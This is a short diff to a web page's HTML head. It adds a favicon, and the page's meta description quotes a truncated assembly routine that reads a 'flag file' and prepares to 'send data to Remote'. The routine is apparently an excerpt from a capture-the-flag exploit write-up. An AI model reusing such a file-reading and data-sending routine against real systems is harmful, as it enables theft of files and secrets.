@@ -3,6 +3,10 @@
   <head>
     <meta name="description" content="```assembly ; ... ; send data routine thread: mcall   40, 0 mcall   68, 12, 32768						; read flag file test    eax, eax jz      .error mov     [file_struct.buf], eax mov     [clipboard_data], eax mcall   70, file_struct cmp     eax, 6 jne     .error mov     [clipboard_data_length], ebx mov     eax, [clipboard_data] jmp .loop .error: mov     ecx, 0xc mov     esi, file_error mov     edi, clipboard_data rep movsb ; send data to Remote .loop: mov     ebx, [counter] mov     esi, [clipboard_data] add" />
     <meta charset="UTF-8" />
+    <link
+      rel="icon"
+      href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='0.9em' fill='white' font-size='90'%3E6f%3C/text%3E%3C/svg%3E"
+    />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <script src="/index.js"></script>
     <link rel="stylesheet" type="text/css" href="/main.css" />
